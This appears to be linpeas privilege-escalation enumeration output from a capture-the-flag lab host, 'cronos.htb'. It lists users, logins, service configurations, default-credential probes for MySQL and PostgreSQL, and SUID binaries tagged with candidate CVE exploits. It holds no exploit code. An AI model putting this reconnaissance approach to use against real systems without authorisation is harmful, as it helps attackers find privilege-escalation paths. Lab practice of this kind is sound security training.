+uid=1000(noulis) gid=1000(noulis) groups=1000(noulis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
+uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(mysql) gid=111(mysql) groups=111(mysql)
+uid=108(messagebus) gid=112(messagebus) groups=112(messagebus)
+uid=109(uuidd) gid=113(uuidd) groups=113(uuidd)
+uid=110(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=111(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=112(bind) gid=119(bind) groups=119(bind)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 17:02:40 up  1:30,  0 users,  load average: 0.27, 0.14, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+root     tty1                          Sun Apr  9 00:10 - crash  (00:08)
+reboot   system boot  4.4.0-66-generic Sun Apr  9 00:07 - 00:22  (00:14)
+root     tty1                          Wed Mar 22 21:00 - down   (22:32)
+reboot   system boot  4.4.0-66-generic Wed Mar 22 20:55 - 19:32  (22:37)
+noulis   tty1                          Wed Mar 22 20:45 - down   (00:09)
+reboot   system boot  4.4.0-66-generic Wed Mar 22 20:42 - 20:54  (00:12)
+noulis   tty1                          Wed Mar 22 20:34 - down   (00:08)
+reboot   system boot  4.4.0-62-generic Wed Mar 22 20:24 - 20:42  (00:18)
+
+wtmp begins Wed Mar 22 20:24:10 2017
+
+[+] Last time logon each user
+Username         Port     From             Latest
+root             tty1                      Sun Dec 24 17:43:09 +0200 2017
+noulis           pts/0    10.10.14.141     Thu Jul 27 01:39:12 +0300 2017
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql  Ver 14.14 Distrib 5.7.17, for Linux (x86_64) using  EditLine wrapper
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.18 (Ubuntu)
+Server built:   2016-07-14T12:32:26
+/etc/apache2/sites-enabled/admin.conf:ServerName admin.cronos.htb
+/etc/apache2/sites-enabled/laravel.conf:ServerName cronos.htb
+/etc/apache2/sites-enabled/laravel.conf:ServerAlias www.cronos.htb
+PHP exec extensions
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php7.0.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php7.0.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php7.0.conf:    SetHandler application/x-httpd-php-source
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+Found 
+cat: '': No such file or directory
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+/usr/share/doc/rsync/examples/rsyncd.conf
+[ftp]
+	comment = public archive
+	path = /var/www/pub
+	use chroot = yes
+	lock file = /var/lock/rsyncd
+	read only = yes
+	list = yes
+	uid = nobody
+	gid = nogroup
+	strict modes = yes
+	ignore errors = no
+	ignore nonreadable = yes
+	transfer logging = no
+	timeout = 600
+	refuse options = checksum dry-run
+	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+Port 22
+PermitRootLogin prohibit-password
+PubkeyAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+  --> Some certificates were found (out limited):
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.crt
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.crt
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.crt
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.crt
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.crt
+/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.crt
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials no
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+No Sockets found in /var/run/screen/S-www-data.
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/bin/ping
+/bin/umount  --->  BSD/Linux(08-1996)
+/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/fusermount
+/bin/su
+/bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+/bin/ping6
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/sudo  --->  /sudo$
+/usr/bin/chfn  --->  SuSE_9.3/10
+/usr/bin/newgrp  --->  HP-UX_10.20
+/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/screen  --->  GNU_Screen_4.5.0
+/usr/bin/ssh-agent
+/usr/bin/mlocate
+/usr/bin/chage
+/usr/bin/crontab
+/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/wall
+/usr/bin/bsd-write
+/usr/bin/expiry
+
+[+] Cheking missconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities:
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+/lost+found
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 24
+drwxr-xr-x  2 root root 4096 Mar 22  2017 .
+drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
+-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh
+-rw-r--r--  1 root root  101 Jan 14  2017 apps-bin-path.sh
+-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
+-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home
+/home/noulis/.mysql_history
+/home/noulis/.bash_history
+/home/noulis/.composer
+/home/noulis/.composer/keys.tags.pub
+/home/noulis/.composer/.htaccess
+/home/noulis/.composer/cache
+/home/noulis/.composer/cache/files
+/home/noulis/.composer/cache/files/mockery
+/home/noulis/.composer/cache/files/mockery/mockery
+/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip
+/home/noulis/.composer/cache/files/tijsverkoyen
+/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles
+/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip
+/home/noulis/.composer/cache/files/sebastian
+/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup
+/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
+/home/noulis/.composer/cache/files/sebastian/resource-operations
+/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
+/home/noulis/.composer/cache/files/sebastian/diff
+/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip
+/home/noulis/.composer/cache/files/sebastian/global-state
+/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
+/home/noulis/.composer/cache/files/sebastian/exporter
+/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
+/home/noulis/.composer/cache/files/sebastian/comparator
+/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
+/home/noulis/.composer/cache/files/sebastian/version
+/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
+/home/noulis/.composer/cache/files/sebastian/environment
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/syslog
+/var/log/auth.log
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+[+] Files inside /home/www-data (limit 20)
+
+[+] Files inside others home (limit 20)
+/home/noulis/user.txt
+/home/noulis/.mysql_history
+/home/noulis/.bash_history
+/home/noulis/.sudo_as_admin_successful
+/home/noulis/.bashrc
+/home/noulis/.bash_logout
+/home/noulis/.profile
+/home/noulis/.composer/keys.tags.pub
+/home/noulis/.composer/.htaccess
+/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip
+/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip
+/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
+/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
+/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip
+/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
+/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
+/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
+/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
+/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip
+/home/noulis/.composer/cache/files/sebastian/recursion-context/82276e6cc560a972510bb0c2dc0aa78fa4701777.zip
+grep: write error: Broken pipe
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 8710 Mar  3  2017 /lib/modules/4.4.0-66-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 8990 Mar  3  2017 /lib/modules/4.4.0-66-generic/kernel/drivers/power/wm831x_backup.ko
+-rw-r--r-- 1 root root 8710 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 8990 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/power/wm831x_backup.ko
+-rw-r--r-- 1 root root 8710 Mar 31  2017 /lib/modules/4.4.0-72-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 8990 Mar 31  2017 /lib/modules/4.4.0-72-generic/kernel/drivers/power/wm831x_backup.ko
+-rw-r--r-- 1 root root 128 Mar 22  2017 /var/lib/sgml-base/supercatalog.old
+-rw-r--r-- 1 root root 20 Feb  9  2017 /etc/vmware-tools/tools.conf.old
+-rw-r--r-- 1 root root 673 Mar 22  2017 /etc/xml/xml-core.xml.old
+-rw-r--r-- 1 root root 610 Mar 22  2017 /etc/xml/catalog.old
+-rw-r--r-- 1 root root 190058 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old
+-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 190258 Mar  3  2017 /usr/src/linux-headers-4.4.0-66-generic/.config.old
+-rw-r--r-- 1 root root 0 Mar  3  2017 /usr/src/linux-headers-4.4.0-66-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Mar  3  2017 /usr/src/linux-headers-4.4.0-66-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 190247 Mar 31  2017 /usr/src/linux-headers-4.4.0-72-generic/.config.old
+-rw-r--r-- 1 root root 0 Mar 31  2017 /usr/src/linux-headers-4.4.0-72-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Mar 31  2017 /usr/src/linux-headers-4.4.0-72-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
+-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 11358 Apr  9  2017 /usr/share/info/dir.old
+
+[+] Searching tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/www/laravel/vendor/psy/psysh/test/fixtures/default/.local/share/psysh/php_manual.sqlite (limit 20)
+ -> Extracting tables from /var/www/laravel/vendor/psy/psysh/test/fixtures/legacy/.psysh/php_manual.sqlite (limit 20)
+
+[+] Web files?(output limit)
+/var/www/:
+total 20K
+drwxr-xr-x  5 root     root     4.0K Apr  9  2017 .
+drwxr-xr-x 14 root     root     4.0K Mar 22  2017 ..
+drwxr-xr-x  2 www-data www-data 4.0K Jul 27  2017 admin
+drwxr-xr-x  2 www-data www-data 4.0K Jul 27  2017 html
+drwxr-xr-x 13 www-data www-data 4.0K Apr  9  2017 laravel
+
+/var/www/admin:
+total 32K
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 2188 Sep  1  2015 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile
+./linpeas.sh: 2490: [: /etc/systemd/system/timers.target.wants/snapd.refresh.timer: unexpected operator
+-rw-r--r-- 1 noulis noulis 3771 Mar 22  2017 /home/noulis/.bashrc
+-rw-r--r-- 1 root root 179 Apr  9  2017 /home/noulis/.composer/cache/vcs/https---github.com-symfony-polyfill-mbstring.git/config
+-rw-r--r-- 1 noulis noulis 655 Mar 22  2017 /home/noulis/.profile
+./linpeas.sh: 2490: [: /home/noulis/.sudo_as_admin_successful: unexpected operator
+-rw-r--r-- 1 root root 3106 Oct 22  2015 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 3161 Apr 14  2016 /usr/share/byobu/profiles/bashrc
+-rw-r--r-- 1 root root 870 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 1865 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+drwxr-xr-x 8 www-data www-data 4096 Apr  9  2017 /var/www/laravel/.git
+-rw-r--r-- 1 www-data www-data 263 Apr  9  2017 /var/www/laravel/.git/config
+-rw-r--r-- 1 www-data www-data 0 Mar 19  2017 /var/www/laravel/vendor/psy/psysh/test/fixtures/default/.config/psysh/psysh_history
+Searching possible passwords inside /var/www/laravel/vendor/psy/psysh/test/fixtures/default/.config/psysh/psysh_history (limit 100)
+
+-rw-r--r-- 1 www-data www-data 0 Mar 19  2017 /var/www/laravel/vendor/psy/psysh/test/fixtures/mixed/.psysh/psysh_history
+Searching possible passwords inside /var/www/laravel/vendor/psy/psysh/test/fixtures/mixed/.psysh/psysh_history (limit 100)
+
+drwxr-xr-x 8 www-data www-data 4096 Apr  9  2017 /var/www/laravel/vendor/symfony/polyfill-mbstring/.git
+-rw-r--r-- 1 www-data www-data 452 Apr  9  2017 /var/www/laravel/vendor/symfony/polyfill-mbstring/.git/config
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+./linpeas.sh: 2517: ./linpeas.sh: f: not found
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+uniq: write error: Broken pipe
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/run/lock
+/run/lock/apache2
+/run/screen/S-www-data
+/tmp
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/linpeas.sh
+/tmp/lse.sh
+/tmp/tmux-33
+/var/cache/apache2/mod_cache_disk
+/var/crash
+/var/lib/lxcfs/cgroup/memory/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/bind9.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-cronosx2dvg-swap_1.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2dnamex2dcronosx2dx2dvgx2dswap_1.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2duuidx2dLVMx2dugG31L7SgY5Eq7gNrbTJm4cB1GDM01JlrG31I4305630g1F9wbsXioYxpf3XSPmJ.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-19b6bfcdx2d84f4x2d43c9x2d90c2x2dc434fa2a5c23.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-dmx2d1.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-cronosx2dx2dvgx2dswap_1.swap/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens160.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-systemdx2dfsck.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
